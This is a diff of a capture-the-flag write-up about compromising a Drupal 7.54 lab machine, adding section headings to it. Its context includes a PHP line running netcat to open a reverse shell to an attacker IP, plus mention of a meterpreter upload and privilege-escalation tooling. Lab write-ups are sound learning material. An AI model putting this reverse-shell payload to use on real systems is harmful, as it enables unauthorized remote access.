@@ -9,7 +9,7 @@
 ## 1) Scans
 ![image](https://github.com/partyh4t/Write-ups/assets/114421293/900fd3f7-bc43-414b-a7d1-1aa87ec1381f)
 
-
+## 2) Web Enumeration
 Heading to the webpage, we're met with Drupal
 ![image](https://github.com/partyh4t/Write-ups/assets/114421293/df3dfa47-769b-401c-9c4e-9651018415bd)
 
@@ -21,7 +21,7 @@ With some testing, and checking the robots.txt, we notice:
 As we can see, we now know the exact version number of the CMS being used.
 ![image](https://github.com/partyh4t/Write-ups/assets/114421293/cbecd508-9201-4196-9d28-40c0b13ae57f)
 
-
+## 3) Exploitation
 With some research "Drupal 7.54 exploit" we instantly are met with:
 ![image](https://github.com/partyh4t/Write-ups/assets/114421293/40c9887d-fbc0-418f-8cd6-7f422b59ff2f)
 
@@ -82,6 +82,7 @@ shell_exec('nc64.exe -e cmd 10.10.14.15 1234')
 ?>
 ```
 
+## 4) Privilege Escalation
 Now that we had access to the machine, i uploaded a meterpreter executable so i can use metasploit.
 
 Once that was done, i ran local_exploit_suggester on the target, and was given multiple exploits that the target seemed to be vulnerable to.
